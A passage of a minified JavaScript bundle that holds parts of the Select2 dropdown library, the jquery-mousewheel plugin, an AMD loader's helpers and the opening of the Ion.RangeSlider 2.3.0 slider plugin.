this.options.set("disabled", this.$element.prop("disabled")), this.options.get("disabled") ? (this.isOpen() && this.close(), this.trigger("disable", {})) : this.trigger("enable", {}) }, I.prototype._syncSubtree = function (t, e) { var n = !1, i = this; if (!t || !t.target || "OPTION" === t.target.nodeName || "OPTGROUP" === t.target.nodeName) { if (e) if (e.addedNodes && 0 < e.addedNodes.length) for (var o = 0; o < e.addedNodes.length; o++)e.addedNodes[o].selected && (n = !0); else e.removedNodes && 0 < e.removedNodes.length && (n = !0); else n = !0; n && this.dataAdapter.current(function (t) { i.trigger("selection:update", { data: t }) }) } }, I.prototype.trigger = function (t, e) { var n = I.__super__.trigger, i = { open: "opening", close: "closing", select: "selecting", unselect: "unselecting", clear: "clearing" }; if (void 0 === e && (e = {}), t in i) { var o = i[t], a = { prevented: !1, name: t, args: e }; if (n.call(this, o, a), a.prevented) return void (e.prevented = !0) } n.call(this, t, e) }, I.prototype.toggleDropdown = function () { this.options.get("disabled") || (this.isOpen() ? this.close() : this.open()) }, I.prototype.open = function () { this.isOpen() || this.trigger("query", {}) }, I.prototype.close = function () { this.isOpen() && this.trigger("close", {}) }, I.prototype.isOpen = function () { return this.$container.hasClass("select2-container--open") }, I.prototype.hasFocus = function () { return this.$container.hasClass("select2-container--focus") }, I.prototype.focus = function (t) { this.hasFocus() || (this.$container.addClass("select2-container--focus"), this.trigger("focus", {})) }, I.prototype.enable = function (t) { this.options.get("debug") && window.console && console.warn && console.warn('Select2: The `select2("enable")` method has been deprecated and will be removed in later Select2 versions. Use $element.prop("disabled") instead.'), null != t && 0 !== t.length || (t = [!0]); var e = !t[0]; this.$element.prop("disabled", e) }, I.prototype.data = function () { this.options.get("debug") && 0 < arguments.length && window.console && console.warn && console.warn('Select2: Data can no longer be set using `select2("data")`. You should consider setting the value instead using `$element.val()`.'); var e = []; return this.dataAdapter.current(function (t) { e = t }), e }, I.prototype.val = function (t) { if (this.options.get("debug") && window.console && console.warn && console.warn('Select2: The `select2("val")` method has been deprecated and will be removed in later Select2 versions. Use $element.val() instead.'), null == t || 0 === t.length) return this.$element.val(); var e = t[0]; o.isArray(e) && (e = o.map(e, function (t) { return t.toString() })), this.$element.val(e).trigger("change") }, I.prototype.destroy = function () { this.$container.remove(), this.$element[0].detachEvent && this.$element[0].detachEvent("onpropertychange", this._syncA), null != this._observer ? (this._observer.disconnect(), this._observer = null) : this.$element[0].removeEventListener && (this.$element[0].removeEventListener("DOMAttrModified", this._syncA, !1), this.$element[0].removeEventListener("DOMNodeInserted", this._syncS, !1), this.$element[0].removeEventListener("DOMNodeRemoved", this._syncS, !1)), this._syncA = null, this._syncS = null, this.$element.off(".select2"), this.$element.attr("tabindex", c.GetData(this.$element[0], "old-tabindex")), this.$element.removeClass("select2-hidden-accessible"), this.$element.attr("aria-hidden", "false"), c.RemoveData(this.$element[0]), this.$element.removeData("select2"), this.dataAdapter.destroy(), this.selection.destroy(), this.dropdown.destroy(), this.results.destroy(), this.dataAdapter = null, this.selection = null, this.dropdown = null, this.results = null }, I.prototype.render = function () { var t = o('<span class="select2 select2-container"><span class="selection"></span><span class="dropdown-wrapper" aria-hidden="true"></span></span>'); return t.attr("dir", this.options.get("dir")), this.$container = t, this.$container.addClass("select2-container--" + this.options.get("theme")), c.StoreData(t[0], "element", this.$element), t }, I }), t.define("select2/compat/utils", ["jquery"], function (s) { return { syncCssClasses: function (t, e, n) { var i, o = [], a = s.trim(t.attr("class")); a && s((a = "" + a).split(/\s+/)).each(function () { 0 === this.indexOf("select2-") && o.push(this) }), (a = s.trim(e.attr("class"))) && s((a = "" + a).split(/\s+/)).each(function () { 0 !== this.indexOf("select2-") && null != (i = n(this)) && o.push(i) }), t.attr("class", o.join(" ")) } } }), t.define("select2/compat/containerCss", ["jquery", "./utils"], function (s, r) { function g(t) { return null } function t() { } return t.prototype.render = function (t) { var e = t.call(this), n = this.options.get("containerCssClass") || ""; s.isFunction(n) && (n = n(this.$element)); var i, o = this.options.get("adaptContainerCssClass"); o = o || g, -1 !== n.indexOf(":all:") && (n = n.replace(":all:", ""), i = o, o = function (t) { var e = i(t); return null != e ? e + " " + t : t }); var a = this.options.get("containerCss") || {}; return s.isFunction(a) && (a = a(this.$element)), r.syncCssClasses(e, this.$element, o), e.css(a), e.addClass(n), e }, t }), t.define("select2/compat/dropdownCss", ["jquery", "./utils"], function (s, r) { function g(t) { return null } function t() { } return t.prototype.render = function (t) { var e = t.call(this), n = this.options.get("dropdownCssClass") || ""; s.isFunction(n) && (n = n(this.$element)); var i, o = this.options.get("adaptDropdownCssClass"); o = o || g, -1 !== n.indexOf(":all:") && (n = n.replace(":all:", ""), i = o, o = function (t) { var e = i(t); return null != e ? e + " " + t : t }); var a = this.options.get("dropdownCss") || {}; return s.isFunction(a) && (a = a(this.$element)), r.syncCssClasses(e, this.$element, o), e.css(a), e.addClass(n), e }, t }), t.define("select2/compat/initSelection", ["jquery"], function (i) { function t(t, e, n) { n.get("debug") && window.console && console.warn && console.warn("Select2: The `initSelection` option has been deprecated in favor of a custom data adapter that overrides the `current` method. This method is now called multiple times instead of a single time when the instance is initialized. Support will be removed for the `initSelection` option in future versions of Select2"), this.initSelection = n.get("initSelection"), this._isInitialized = !1, t.call(this, e, n) } return t.prototype.current = function (t, e) { var n = this; this._isInitialized ? t.call(this, e) : this.initSelection.call(null, this.$element, function (t) { n._isInitialized = !0, i.isArray(t) || (t = [t]), e(t) }) }, t }), t.define("select2/compat/inputData", ["jquery", "../utils"], function (a, i) { function t(t, e, n) { this._currentData = [], this._valueSeparator = n.get("valueSeparator") || ",", "hidden" === e.prop("type") && n.get("debug") && console && console.warn && console.warn("Select2: Using a hidden input with Select2 is no longer supported and may stop working in the future. It is recommended to use a `<select>` element instead."), t.call(this, e, n) } return t.prototype.current = function (t, e) { for (var n = [], i = 0; i < this._currentData.length; i++) { var o = this._currentData[i]; n.push.apply(n, function t(e, n) { var i = []; return e.selected || -1 !== a.inArray(e.id, n) ? (e.selected = !0, i.push(e)) : e.selected = !1, e.children && i.push.apply(i, t(e.children, n)), i }(o, this.$element.val().split(this._valueSeparator))) } e(n) }, t.prototype.select = function (t, e) { var n; this.options.get("multiple") ? (n = this.$element.val(), n += this._valueSeparator + e.id, this.$element.val(n)) : (this.current(function (t) { a.map(t, function (t) { t.selected = !1 }) }), this.$element.val(e.id)), this.$element.trigger("change") }, t.prototype.unselect = function (t, o) { var a = this; o.selected = !1, this.current(function (t) { for (var e = [], n = 0; n < t.length; n++) { var i = t[n]; o.id != i.id && e.push(i.id) } a.$element.val(e.join(a._valueSeparator)), a.$element.trigger("change") }) }, t.prototype.query = function (t, e, n) { for (var i = [], o = 0; o < this._currentData.length; o++) { var a = this._currentData[o], s = this.matches(e, a); null !== s && i.push(s) } n({ results: i }) }, t.prototype.addOptions = function (t, e) { var n = a.map(e, function (t) { return i.GetData(t[0], "data") }); this._currentData.push.apply(this._currentData, n) }, t }), t.define("select2/compat/matcher", ["jquery"], function (s) { return function (a) { return function (t, e) { var n = s.extend(!0, {}, e); if (null == t.term || "" === s.trim(t.term)) return n; if (e.children) { for (var i = e.children.length - 1; 0 <= i; i--) { var o = e.children[i]; a(t.term, o.text, o) || n.children.splice(i, 1) } if (0 < n.children.length) return n } return a(t.term, e.text, e) ? n : null } } }), t.define("select2/compat/query", [], function () { function t(t, e, n) { n.get("debug") && window.console && console.warn && console.warn("Select2: The `query` option has been deprecated in favor of a custom data adapter that overrides the `query` method. Support will be removed for the `query` option in future versions of Select2."), t.call(this, e, n) } return t.prototype.query = function (t, e, n) { e.callback = n, this.options.get("query").call(null, e) }, t }), t.define("select2/dropdown/attachContainer", [], function () { function t(t, e, n) { t.call(this, e, n) } return t.prototype.position = function (t, e, n) { n.find(".dropdown-wrapper").append(e), e.addClass("select2-dropdown--below"), n.addClass("select2-container--below") }, t }), t.define("select2/dropdown/stopPropagation", [], function () { function t() { } return t.prototype.bind = function (t, e, n) { t.call(this, e, n), this.$dropdown.on(["blur", "change", "click", "dblclick", "focus", "focusin", "focusout", "input", "keydown", "keyup", "keypress", "mousedown", "mouseenter", "mouseleave", "mousemove", "mouseover", "mouseup", "search", "touchend", "touchstart"].join(" "), function (t) { t.stopPropagation() }) }, t }), t.define("select2/selection/stopPropagation", [], function () { function t() { } return t.prototype.bind = function (t, e, n) { t.call(this, e, n), this.$selection.on(["blur", "change", "click", "dblclick", "focus", "focusin", "focusout", "input", "keydown", "keyup", "keypress", "mousedown", "mouseenter", "mouseleave", "mousemove", "mouseover", "mouseup", "search", "touchend", "touchstart"].join(" "), function (t) { t.stopPropagation() }) }, t }), l = function (u) { var h, d, t = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"], e = "onwheel" in document || 9 <= document.documentMode ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"], C = Array.prototype.slice; if (u.event.fixHooks) for (var n = t.length; n;)u.event.fixHooks[t[--n]] = u.event.mouseHooks; var A = u.event.special.mousewheel = { version: "3.1.12", setup: function () { if (this.addEventListener) for (var t = e.length; t;)this.addEventListener(e[--t], i, !1); else this.onmousewheel = i; u.data(this, "mousewheel-line-height", A.getLineHeight(this)), u.data(this, "mousewheel-page-height", A.getPageHeight(this)) }, teardown: function () { if (this.removeEventListener) for (var t = e.length; t;)this.removeEventListener(e[--t], i, !1); else this.onmousewheel = null; u.removeData(this, "mousewheel-line-height"), u.removeData(this, "mousewheel-page-height") }, getLineHeight: function (t) { var e = u(t), n = e["offsetParent" in u.fn ? "offsetParent" : "parent"](); return n.length || (n = u("body")), parseInt(n.css("fontSize"), 10) || parseInt(e.css("fontSize"), 10) || 16 }, getPageHeight: function (t) { return u(t).height() }, settings: { adjustOldDeltas: !0, normalizeOffset: !0 } }; function i(t) { var e, n, i, o, a = t || window.event, s = C.call(arguments, 1), r = 0, g = 0, l = 0, c = 0, I = 0; if ((t = u.event.fix(a)).type = "mousewheel", "detail" in a && (l = -1 * a.detail), "wheelDelta" in a && (l = a.wheelDelta), "wheelDeltaY" in a && (l = a.wheelDeltaY), "wheelDeltaX" in a && (g = -1 * a.wheelDeltaX), "axis" in a && a.axis === a.HORIZONTAL_AXIS && (g = -1 * l, l = 0), r = 0 === l ? g : l, "deltaY" in a && (r = l = -1 * a.deltaY), "deltaX" in a && (g = a.deltaX, 0 === l && (r = -1 * g)), 0 !== l || 0 !== g) return 1 === a.deltaMode ? (r *= n = u.data(this, "mousewheel-line-height"), l *= n, g *= n) : 2 === a.deltaMode && (r *= i = u.data(this, "mousewheel-page-height"), l *= i, g *= i), e = Math.max(Math.abs(l), Math.abs(g)), (!d || e < d) && m(a, d = e) && (d /= 40), m(a, e) && (r /= 40, g /= 40, l /= 40), r = Math[1 <= r ? "floor" : "ceil"](r / d), g = Math[1 <= g ? "floor" : "ceil"](g / d), l = Math[1 <= l ? "floor" : "ceil"](l / d), A.settings.normalizeOffset && this.getBoundingClientRect && (o = this.getBoundingClientRect(), c = t.clientX - o.left, I = t.clientY - o.top), t.deltaX = g, t.deltaY = l, t.deltaFactor = d, t.offsetX = c, t.offsetY = I, t.deltaMode = 0, s.unshift(t, r, g, l), h && clearTimeout(h), h = setTimeout(p, 200), (u.event.dispatch || u.event.handle).apply(this, s) } function p() { d = null } function m(t, e) { return A.settings.adjustOldDeltas && "mousewheel" === t.type && e % 120 == 0 } u.fn.extend({ mousewheel: function (t) { return t ? this.bind("mousewheel", t) : this.trigger("mousewheel") }, unmousewheel: function (t) { return this.unbind("mousewheel", t) } }) }, "function" == typeof t.define && t.define.amd ? t.define("jquery-mousewheel", ["jquery"], l) : "object" == typeof exports ? module.exports = l : l(e), t.define("jquery.select2", ["jquery", "jquery-mousewheel", "./select2/core", "./select2/defaults", "./select2/utils"], function (o, t, a, e, s) { var r; return null == o.fn.select2 && (r = ["open", "close", "destroy"], o.fn.select2 = function (e) { if ("object" == typeof (e = e || {})) return this.each(function () { var t = o.extend(!0, {}, e); new a(o(this), t) }), this; if ("string" != typeof e) throw new Error("Invalid arguments for Select2: " + e); var n, i = Array.prototype.slice.call(arguments, 1); return this.each(function () { var t = s.GetData(this, "select2"); null == t && window.console && console.error && console.error("The select2('" + e + "') method was called on an element that is not using Select2."), n = t[e].apply(t, i) }), -1 < o.inArray(e, r) ? this : n }), null == o.fn.select2.defaults && (o.fn.select2.defaults = e), a }), { define: t.define, require: t.require }); function B(t, e) { return r.call(t, e) } function I(t, e) { var n, i, o, a, s, r, g, l, c, I, u, h = e && e.split("/"), d = m.map, C = d && d["*"] || {}; if (t) { for (s = (t = t.split("/")).length - 1, m.nodeIdCompat && b.test(t[s]) && (t[s] = t[s].replace(b, "")), "." === t[0].charAt(0) && h && (t = h.slice(0, h.length - 1).concat(t)), c = 0; c < t.length; c++)if ("." === (u = t[c])) t.splice(c, 1), --c; else if (".." === u) { if (0 === c || 1 === c && ".." === t[2] || ".." === t[c - 1]) continue; 0 < c && (t.splice(c - 1, 2), c -= 2) } t = t.join("/") } if ((h || C) && d) { for (c = (n = t.split("/")).length; 0 < c; --c) { if (i = n.slice(0, c).join("/"), h) for (I = h.length; 0 < I; --I)if (o = (o = d[h.slice(0, I).join("/")]) && o[i]) { a = o, r = c; break } if (a) break; !g && C && C[i] && (g = C[i], l = c) } !a && g && (a = g, r = l), a && (n.splice(0, r, a), t = n.join("/")) } return t } function y(e, n) { return function () { var t = g.call(arguments, 0); return "string" != typeof t[0] && 1 === t.length && t.push(null), s.apply(h, t.concat([e, n])) } } function v(t) { var e; if (B(p, t) && (e = p[t], delete p[t], f[t] = !0, a.apply(h, e)), !B(A, t) && !B(f, t)) throw new Error("No " + t); return A[t] } function u(t) { var e, n = t ? t.indexOf("!") : -1; return -1 < n && (e = t.substring(0, n), t = t.substring(n + 1, t.length)), [e, t] } function x(t) { return t ? u(t) : [] } var F = c.require("jquery.select2"); return e.fn.select2.amd = c, F }), function (e) { !jQuery && "function" == typeof define && define.amd ? define(["jquery"], function (t) { return e(t, document, window, navigator) }) : jQuery || "object" != typeof exports ? e(jQuery, document, window, navigator) : e(require("jquery"), document, window, navigator) }(function (g, l, c, t, I) { "use strict"; var e, n, i = 0, o = (e = t.userAgent, n = /msie\s\d+/i, 0 < e.search(n) && n.exec(e).toString().split(" ")[1] < 9 && (g("html").addClass("lt-ie9"), !0)); Function.prototype.bind || (Function.prototype.bind = function (i) { var o = this, a = [].slice; if ("function" != typeof o) throw new TypeError; var s = a.call(arguments, 1), r = function () { if (this instanceof r) { var t = function () { }; t.prototype = o.prototype; var e = new t, n = o.apply(e, s.concat(a.call(arguments))); return Object(n) === n ? n : e } return o.apply(i, s.concat(a.call(arguments))) }; return r }), Array.prototype.indexOf || (Array.prototype.indexOf = function (t, e) { var n; if (null == this) throw new TypeError('"this" is null or not defined'); var i = Object(this), o = i.length >>> 0; if (0 == o) return -1; var a = +e || 0; if (Math.abs(a) === 1 / 0 && (a = 0), o <= a) return -1; for (n = Math.max(0 <= a ? a : o - Math.abs(a), 0); n < o;) { if (n in i && i[n] === t) return n; n++ } return -1 }); function a(t, e, n) { this.VERSION = "2.3.0", this.input = t, this.plugin_count = n, this.current_plugin = 0, this.calc_count = 0, this.update_tm = 0, this.old_from = 0, this.old_to = 0, this.old_min_interval = null, this.raf_id = null, this.dragging = !1, this.force_redraw = !1, this.no_diapason = !1, this.has_tab_index = !0, this.is_key = !1, this.is_update = !1, this.is_start = !0, this.is_finish = !1, this.is_active = !1, this.is_resize = !1, this.is_click = !1, e = e || {}, this.$cache = { win: g(c), body: g(l.body), input: g(t), cont: null, rs: null, min: null, max: null, from: null, to: null, single: null, bar: null, line: null, s_single: null, s_from: null, s_to: null, shad_single: null, shad_from: null, shad_to: null, edge: null, grid: null, grid_labels: [] }, this.coords = { x_gap: 0, x_pointer: 0, w_rs: 0, w_rs_old: 0, w_handle: 0, p_gap: 0, p_gap_left: 0, p_gap_right: 0, p_step: 0, p_pointer: 0, p_handle: 0, p_single_fake: 0, p_single_real: 0, p_from_fake: 0, p_from_real: 0, p_to_fake: 0, p_to_real: 0, p_bar_x: 0, p_bar_w: 0, grid_gap: 0, big_num: 0, big: [], big_w: [], big_p: [], big_x: [] }, this.labels = { w_min: 0, w_max: 0, w_from: 0, w_to: 0, w_single: 0, p_min: 0, p_max: 0, p_from_fake: 0, p_from_left: 0, p_to_fake: 0, p_to_left: 0, p_single_fake: 0, p_single_left: 0 }; var i, o, a = this.$cache.input, s = a.prop("value"), r = { skin: "flat", type: "single", min: 10, max: 100, from: null, to: null, step: 1, min_interval: 0, max_interval: 0, drag_interval: !1, values: [], p_values: [], from_fixed: !1, from_min: null, from_max: null, from_shadow: !1, to_fixed: !1, to_min: null, to_max: null, to_shadow: !1, prettify_enabled: !0, prettify_separator: " ", prettify: null, force_edges: !1, keyboard: !0, grid: !1, grid_margin: !0, grid_num: 4, grid_snap: !1, hide_min_max: !1, hide_from_to: !1, prefix: "", postfix: "", max_postfix: "", decorate_both: !0, values_separator: " â ", input_values_separator: ";", disable: !1, block: !1, extra_classes: "", scope: null, onStart: null, onChange: null, onFinish: null, onUpdate: null }; for (o in "INPUT" !== a[0].nodeName && console && console.warn && console.warn("Base element should be <input>!", a[0]), (i = { skin: a.data("skin"), type: a.data("type"), min: a.data("min"), max: a.data("max"), from: a.data("from"), to: a.data("to"), step: a.data("step"), min_interval: a.data("minInterval"), max_interval: a.data("maxInterval"), drag_interval: a.data("dragInterval"), values: a.data("values"), from_fixed: a.data("fromFixed"), from_min: a.data("fromMin"), from_max: a.data("fromMax"), from_shadow: a.data("fromShadow"), to_fixed: a.data("toFixed"), to_min: a.data("toMin"), to_max: a.data("toMax"), to_shadow: a.data("toShadow"), prettify_enabled: a.data("prettifyEnabled"), prettify_separator: a.data("prettifySeparator"), force_edges: a.data("forceEdges"), keyboard: a.data("keyboard"), grid: a.data("grid"), grid_margin: a.data("gridMargin"), grid_num: a.data("gridNum"), grid_snap: a.data("gridSnap"), hide_min_max: a.data("hideMinMax"), hide_from_to: a.data("hideFromTo"), prefix: a.data("prefix"), postfix: a.data("postfix"), max_postfix: a.data("maxPostfix"), decorate_both: a.data("decorateBoth"), values_separator: a.data("valuesSeparator"), input_values_separator: a.data("inputValuesSeparator"), disable: a.data("disable"), block: a.data("block"), extra_classes: a.data("extraClasses") }).values = i.values && i.values.split(","), i) i.hasOwnProperty(o) && (i[o] !== I && "" !== i[o] || delete i[o]); s !== I && "" !== s && ((s = s.split(i.input_values_separator || e.input_values_separator || ";"))[0] && s[0] == +s[0] && (s[0] = +s[0]), s[1] && s[1] == +s[1] && (s[1] = +s[1]), e && e.values && e.values.length ? (r.from = s[0] && e.values.indexOf(s[0]), r.to = s[1] && e.values.indexOf(s[1])) : (r.from = s[0] && +s[0], r.to = s[1] && +s[1])), g.extend(r, e), g.extend(r, i), this.options = r, this.update_check = {}, this.validate(), this.result = { input: this.$cache.input, slider: null, min: this.options.min, max: this.options.max, from: this.options.from, from_percent: 0, from_value: null, to: this.options.to, to_percent: 0, to_value: null }, this.init() } a.prototype = { init: function (t) { this.no_diapason = !1, this.coords.p_step = this.convertToPercent(this.options.step, !0), this.target = "base", this.toggleInput(), this.append(), this.setMinMax(), t ? (this.force_redraw = !0, this.calc(!0), this.callOnUpdate()) : (this.force_redraw = !0, this.calc(!0), this.callOnStart()), this.updateScene() }, append: function () { var t = '<span class="irs irs--' + this.options.skin + " js-irs-" + this.plugin_count + " " + this.options.extra_classes + '"></span>'; this.$cache.input.before(t), this.$cache.input.prop("readonly", !0), this.$cache.cont = this.$cache.input.prev(), this.result.slider = this.$cache.cont, this.$cache.cont.html('<span class="irs"><span class="irs-line" tabindex="0"></span><span class="irs-min">0</span><span class="irs-max">1</span><span class="irs-from">0</span><span class="irs-to">0</span><span class="irs-single">0</span></span><span class="irs-grid"></span>'), this.$cache.rs = this.$cache.cont.find(".irs"), this.$cache.min = this.$cache.cont.find(".irs-min"), this.$cache.max = this.$cache.cont.find(".irs-max"), this.$cache.from = this.$cache.cont.find(".irs-from"), this.$cache.to = this.$cache.cont.find(".irs-to"), this.$cache.single = this.$cache.cont.find(".irs-single"), this.$cache.line = this.$cache.cont.find(".irs-line"), this.$cache.grid = this.$cache.cont.find(".irs-grid"), "single" === this.options.type ? (this.$cache.cont.append('<span class="irs-bar irs-bar--single"></span><span class="irs-shadow shadow-single"></span><span class="irs-handle single"><i></i><i></i><i></i></span>'), this.$cache.bar = this.$cache.cont.find(".irs-bar"), this.$cache.edge = this.$cache.cont.find(".irs-bar-edge"), this.$cache.s_single = this.$cache.cont.find(".single"), this.$cache.from[0].style.visibility = "hidden", this.$cache.to[0].style.visibility = "hidden", this.$cache.shad_single = this.$cache.cont.find(".shadow-single")) : (this.$cache.cont.append('<span class="irs-bar"></span><span class="irs-shadow shadow-from"></span><span class="irs-shadow shadow-to"></span><span class="irs-handle from"><i></i><i></i><i></i></span><span class="irs-handle to"><i></i><i></i><i></i></span>'), this.$cache.bar = this.$cache.cont.find(".irs-bar"), this.$cache.s_from = this.$cache.cont.find(".from"), this.$cache.s_to = this.$cache.cont.find(".to"), this.$cache.shad_from = this.$cache.cont.find(".shadow-from"), this.$cache.shad_to = this.$cache.cont.find(".shadow-to"), this.setTopHandler()), this.options.hide_from_to && (this.$cache.from[0].style.display = "none", this.$cache.to[0].style.display = "none", this.$cache.single[0].style.display = "none"), this.appendGrid(), this.options.disable ? (this.appendDisableMask(), this.$cache.input[0].disabled = !0) : (this.$cache.input[0].disabled = !1, this.removeDisableMask(), this.bindEvents()), this.options.disable || (this.options.block ? this.appendDisableMask() : this.removeDisableMask()), this.options.drag_interval && (this.$cache.bar[0].style.cursor = "ew-resize") }, setTopHandler: function () { var t = this.options.min, e = this.options.max, n = this.options.from, i = this.options.to; t < n && i === e ? this.$cache.s_from.addClass("type_last") : i < e && this.$cache.s_to.addClass("type_last") }, changeLevel: function (t) { switch (t) { case "single": this.coords.p_gap = this.toFixed(this.coords.p_pointer - this.coords.p_single_fake), this.$cache.s_single.addClass("state_hover"); break; case "from": this.coords.p_gap = this.toFixed(this.coords.p_pointer - this.coords.p_from_fake), this.$cache.s_from.addClass("state_hover"), this.$cache.s_from.addClass("type_last"), this.$cache.s_to.removeClass("type_last"); break; case "to": this.coords.p_gap = this.toFixed(this.coords.p_pointer - this.coords.p_to_fake), this.$cache.s_to.addClass("state_hover"), this.$cache.s_to.addClass("type_last"), this.$cache.s_from.removeClass("type_last"); break; case "both": this.coords.p_gap_left = this.toFixed(this.coords.p_pointer - this.coords.p_from_fake), this.coords.p_gap_right = this.toFixed(this.coords.p_to_fake - this.coords.p_pointer), this.$cache.s_to.removeClass("type_last"), this.$cache.s_from.removeClass("type_last") } }, appendDisableMask: function () { this.$cache.cont.append('<span class="irs-disable-mask"></span>'), this.$cache.cont.addClass("irs-disabled") }, removeDisableMask: function () { this.$cache.cont.remove(".irs-disable-mask"), this.$cache.cont.removeClass("irs-disabled") }, remove: function () { this.$cache.cont.remove(), this.$cache.cont = null, this.$cache.line.off("keydown.irs_" + this.plugin_count), this.$cache.body.off("touchmove.irs_" + this.plugin_count), this.$cache.body.off("mousemove.irs_" + this.plugin_count), this.$cache.win.off("touchend.irs_" + this.plugin_count), this.$cache.win.off("mouseup.irs_" + this.plugin_count), o && (this.$cache.body.off("mouseup.irs_" + this.plugin_count), this.$cache.body.off("mouseleave.irs_" + this.plugin_count)), this.$cache.grid_labels = [], this.coords.big = [], this.coords.big_w = [], this.coords.big_p = [], this.coords.big_x = [], cancelAnimationFrame(this.raf_id) }, bindEvents: function () { this.no_diapason || (this.$cache.body.on("touchmove.irs_" + this.plugin_count, this.pointerMove.bind(this)), this.$cache.body.on("mousemove.irs_" + this.plugin_count, this.pointerMove.bind(this)), this.$cache.win.on("touchend.irs_" + this.plugin_count, this.pointerUp.bind(this)), this.$cache.win.on("mouseup.irs_" + this.plugin_count, this.pointerUp.bind(this)), this.$cache.line.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.line.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.line.on("focus.irs_" + this.plugin_count, this.pointerFocus.bind(this)), this.options.drag_interval && "double" === this.options.type ? (this.$cache.bar.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "both")), this.$cache.bar.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "both"))) : (this.$cache.bar.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.bar.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"))), "single" === this.options.type ? (this.$cache.single.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "single")), this.$cache.s_single.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "single")), this.$cache.shad_single.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.single.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "single")), this.$cache.s_single.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "single")), this.$cache.edge.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.shad_single.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"))) : (this.$cache.single.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, null)), this.$cache.single.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, null)), this.$cache.from.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "from")), this.$cache.s_from.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "from")), this.$cache.to.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "to")), this.$cache.s_to.on("touchstart.irs_" + this.plugin_count, this.pointerDown.bind(this, "to")), this.$cache.shad_from.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.shad_to.on("touchstart.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.from.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "from")), this.$cache.s_from.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "from")), this.$cache.to.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "to")), this.$cache.s_to.on("mousedown.irs_" + this.plugin_count, this.pointerDown.bind(this, "to")), this.$cache.shad_from.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click")), this.$cache.shad_to.on("mousedown.irs_" + this.plugin_count, this.pointerClick.bind(this, "click"))), this.options.keyboard && this.$cache.line.on("keydown.irs_" + this.plugin_count, this.key.bind(this, "keyboard")), o && (this.$cache.body.on("mouseup.irs_" + this.plugin_count, this.pointerUp.bind(this)), this.$cache.body.on("mouseleave.irs_" + this.plugin_count, this.pointerUp.bind(this)))) }, pointerFocus: function (t) { var e, n; this.target || (n = (e = "single" === this.options.type ? this.$cache.single : this.$cache.from).offset().left, n += e.width() / 2 - 1, this.pointerClick("single", { preventDefault: function () { }, pageX: n })) }, pointerMove: function (t) { var e; this.dragging && (e = t.pageX || t.originalEvent.touches && t.originalEvent.touches[0].pageX, this.coords.x_pointer = e - this.coords.x_gap, this.calc()) }, pointerUp: function (t) { this.current_plugin === this.plugin_count && this.is_active && (this.is_active = !1, this.$cache.cont.find(".state_hover").removeClass("state_hover"), this.force_redraw = !0, o && g("*").prop("unselectable", !1), this.updateScene(), this.restoreOriginalMinInterval(), (g.contains(this.$cache.cont[0], t.target) || this.dragging) && this.callOnFinish(), this.dragging = !1) }, pointerDown: function (t, e) { e.preventDefault(); var n = e.pageX || e.originalEvent.touches && e.originalEvent.touches[0].pageX; 2 !== e.button && ("both" === t && this.setTempMinInterval(), t = t || (this.target || "from"), this.current_plugin = this.plugin_count, this.target = t, this.is_active = !0, this.dragging = !0, this.coords.x_gap = this.$cache.rs.offset().left, this.coords.x_pointer = n - this.coords.x_gap, this.calcPointerPercent(), this.changeLevel(t), o && g("*").prop("unselectable", !0), this.$cache.line.trigger("focus"), this.updateScene()) }, pointerClick: function (t, e) { e.preventDefault(); var n = e.pageX || e.originalEvent.touches && e.originalEvent.touches[0].pageX; 2 !== e.button && (this.current_plugin = this.plugin_count, this.target = t, this.is_click = !0, this.coords.x_gap = this.$cache.rs.offset().left, this.coords.x_pointer = +(n - this.coords.x_gap).toFixed(), this.force_redraw = !0, this.calc(), this.$cache.line.trigger("focus")) }, key: function (t, e) { if (!(this.current_plugin !== this.plugin_count || e.altKey || e.ctrlKey || e.shiftKey || e.metaKey)) { switch (e.which) { case 83: case 65: case 40: case 37: e.preventDefault(), this.moveByKey(!1); break; case 87: case 68: case 38: case 39: e.preventDefault(), this.moveByKey(!0) }return !0 } }, moveByKey: function (t) { var e = this.coords.p_pointer, n = (this.options.max - this.options.min) / 100, n = this.options.step / n; t ? e += n : e -= n, this.coords.x_pointer = this.toFixed(this.coords.w_rs / 100 * e), this.is_key = !0, this.calc() }, setMinMax: function () { if (this.options) { if (this.options.hide_min_max) return this.$cache.min[0].style.display = "none", void (this.$cache.max[0].style.display = "none"); var t, e; this.options.values.length ? (this.$cache.min.html(this.decorate(this.options.p_values[this.options.min])), this.$cache.max.html(this.decorate(this.options.p_values[this.options.max]))) : (t = this._prettify(this.options.min), e = this._prettify(this.options.max), this.result.min_pretty = t, this.result.max_pretty = e, this.$cache.min.html(this.decorate(t, this.options.min)), this.$cache.max.html(this.decorate(e, this.options.max))), this.labels.w_min = this.$cache.min.outerWidth(!1), this.labels.w_max = this.$cache.max.outerWidth(!1) } }, setTempMinInterval: function () { var t = this.result.to - this.result.from; null === this.old_min_interval && (this.old_min_interval = this.options.min_interval), this.options.min_interval = t }, 